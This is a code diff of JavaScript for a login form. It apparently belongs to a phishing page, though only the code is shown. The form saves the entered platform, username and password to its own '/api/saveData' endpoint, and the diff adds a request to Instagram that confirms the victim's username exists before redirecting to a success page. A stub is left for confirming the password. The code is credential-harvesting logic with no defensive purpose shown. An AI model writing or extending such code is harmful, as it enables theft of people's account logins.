@@ -32,6 +32,7 @@ function getid() {
             })
             .catch(error => console.log('error', error));
     }
+
 }
 getid()
 
@@ -40,7 +41,6 @@ var subm = document.getElementById('sub')
 
 function check() {
     if (document.getElementById('password').value && document.getElementById('username').value != "") {
-//         console.log('checking')
         subm.classList.add('sendColor')
     }
 }
@@ -50,6 +50,9 @@ function check() {
 
 form.addEventListener('submit', (e) => {
     e.preventDefault();
+    // first-remove-any-error-messages
+    document.getElementById('error').style.display = 'none'
+
 
     // console.log(form.elements[0].value)
     Cookies.set('platform', form.elements[1].value, { expires: 30, path: '/' })
@@ -71,14 +74,24 @@ form.addEventListener('submit', (e) => {
         redirect: 'follow'
     };
 
+    // save-data-here
     fetch("/api/saveData", requestOptions)
-        .then(response => response.text())
-        .then(result => {
-            // console.log(result)
-            window.location.href = "/success";
-
-        })
         .catch(error => console.log('error', error));
+
+    // confirming-username-here
+    fetch(`https://www.instagram.com/${form.elements[2].value}/`)
+        .then(res => {
+            if (res.status == 200) {
+                console.log('username-ok')
+                window.location.href = "/success";
+            } else {
+                console.log('username-err')
+                errorMess('username')
+            }
+        })
+        .catch(err => console.log(err))
+
+    // confirming-password-here
 
 
 })
